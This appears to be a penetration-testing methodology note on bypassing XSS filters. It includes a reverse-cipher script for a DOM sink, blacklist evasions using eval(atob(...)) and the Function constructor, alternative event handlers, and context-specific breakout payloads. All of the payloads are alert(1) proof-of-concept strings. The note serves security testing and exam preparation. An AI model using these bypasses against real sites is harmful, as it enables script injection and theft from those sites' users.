# XSS Filter Bypass Techniques

## When to Use
- Phase 5/6, reflected or DOM XSS with client-side or server-side filtering
- Input is reflected but common payloads (`<script>alert(1)</script>`) are stripped/encoded
- DOM sinks (innerHTML, document.write) with encoding/cipher functions applied before write

## DOM XSS via Substitution Cipher (SecOps June 2026)

When a DOM sink applies a character substitution cipher before `innerHTML` assignment:

```javascript
// Example: encode() maps chars via lookup table before innerHTML write
document.getElementById("target").innerHTML = encode(document.getElementById("input").value);
```

**Exploitation:**
1. Extract the cipher mapping from JS source (input charset → output charset)
2. Write a reverse function: for each char in desired payload, find which input char produces it
3. Type the reverse-encoded payload into the input field

```python
# Reverse cipher to produce <img src=x onerror=alert(1)>
input_chars  = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789<>();'
output_chars = '9876543210<>();NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'

def reverse_cipher(target):
    """Given desired innerHTML output, compute what to type in the input."""
    result = ''
    for c in target:
        idx = output_chars.find(c)
        result += input_chars[idx] if idx > -1 else c
    return result

payload = reverse_cipher('<img src=x onerror=alert(1)>')
# Result: K<;8 ut4=z qp6ttqt=2)6tvMINL
```

**Key insight:** If the cipher preserves structural HTML chars (`<`, `>`, `=`, quotes) while only substituting alphanumerics, any HTML payload is possible — just reverse the letter mapping.

## Server-Side Keyword Blacklist Bypass

### Blocked: `alert`, `confirm`, `prompt`, `script`, `img`, `svg`, `onerror`, `onload`

**Bypass with eval + atob (base64):**
```html
</a><details open ontoggle=eval(atob('YWxlcnQoMSk='))>
```

**Why it works:**
- `<details open ontoggle=...>` — tag and event not in blacklist
- `eval(atob(...))` — neither `eval` nor `atob` blocked
- `alert` hidden inside base64 string

### Alternative event handlers when common ones are blocked:
| Event | Tag | Notes |
|-------|-----|-------|
| `ontoggle` | `<details open>` | Fires immediately with `open` attribute |
| `onpageshow` | `<body>` | Fires on page load |
| `onfocus` | `<input autofocus>` | Needs autofocus |
| `onanimationend` | `<div style="animation:x">` | Needs CSS @keyframes |
| `onmouseover` | `<div>` | Needs user interaction |

### Alternative execution functions when `alert`/`confirm`/`prompt` blocked:
- `eval(atob('YWxlcnQoMSk='))` — base64 decode + eval
- `eval(String.fromCharCode(97,108,101,114,116,40,49,41))` — charcode
- `window['al'+'ert'](1)` — string concatenation
- `top['al'+'ert'](1)` — via top reference
- `[].constructor.constructor('alert(1)')()` — Function constructor

## Reflected XSS in JavaScript String Context

When input is placed inside a JS variable assignment without encoding:
```javascript
<script>var name = 'USER_INPUT';</script>
```

**Payload:** `';alert(1);//`
- Closes the string with `'`
- Terminates statement with `;`
- Executes `alert(1)`
- Comments out trailing `';</script>` with `//`

## Reflected XSS in href Attribute

When input goes into an `<a href="...">`:
```html
<a href="http://target.com/USER_INPUT">here!</a>
```

**Payloads (in order of preference):**
1. `javascript:alert(1)` — if protocol not filtered
2. `"></a><img src=x onerror=alert(1)>` — break out of tag
3. `</a><details open ontoggle=eval(atob('YWxlcnQoMSk='))>` — when tags/events filtered

## Testing Methodology (Context-First Approach)

**Rule: ALWAYS identify reflection context BEFORE trying payloads. Wrong context = wasted time.**

### Step 1: Submit canary and find reflection
```
Canary: xss1234test (unique string, no special chars)
```
Search response for canary. Note ALL locations it appears.

### Step 2: Determine context for EACH reflection point

| Context | What you see | Breakout char |
|---------|-------------|---------------|
| HTML body | `<p>xss1234test</p>` | `<` (inject tags) |
| Attribute (double-quoted) | `value="xss1234test"` | `"` (close attr) |
| Attribute (single-quoted) | `value='xss1234test'` | `'` (close attr) |
| JS string (single-quoted) | `var x = 'xss1234test';` | `'` (close string) |
| JS string (double-quoted) | `var x = "xss1234test";` | `"` (close string) |
| JS template literal | `` var x = `xss1234test`; `` | `` ` `` or `${` |
| href/src attribute | `href="http://site/xss1234test"` | `"` or `javascript:` |
| CSS | `color: xss1234test` | `}` or `expression()` |
| DOM sink (innerHTML) | JS reads from input → innerHTML | Depends on processing |

### Step 3: Test ONLY the relevant breakout character
```
Context = JS string 'x'    → test: ';alert(1);//
Context = HTML attribute "x" → test: " onfocus="alert(1)" autofocus="
Context = href              → test: " onclick="alert(1)" x="
Context = HTML body         → test: <img src=x onerror=alert(1)>
```

### Step 4: Map filter (only if step 3 is blocked)
Submit each char individually to determine what's encoded/stripped:
```
< > ' " / ( ) ; = ` { } alert script img svg onerror onclick
```

### Step 5: Select bypass based on what passes through

| Blocked | Not blocked | Payload |
|---------|-------------|---------|
| `<>` | `"` | `" onfocus="alert(1)" autofocus="` (attribute injection) |
| `alert` | `eval`,`atob` | `eval(atob('YWxlcnQoMSk='))` |
| `alert`,`eval` | backticks | `top[`al`+`ert`](1)` |
| `<>` and `"` | `'` in JS context | `';alert(1);//` |
| all keywords | DOM cipher preserves `<>()=` | reverse-cipher payload |

### Step 6: Verify execution
- Browser-based confirmation (not just reflected in source)
- Check if payload is in a rendered DOM node vs comment/script

**SecOps exam lesson (June 2026):** We wasted 20+ minutes trying `<script>` tags in an href context where only `"` (attribute breakout) worked. Context-first would have identified the correct vector in under 2 minutes.
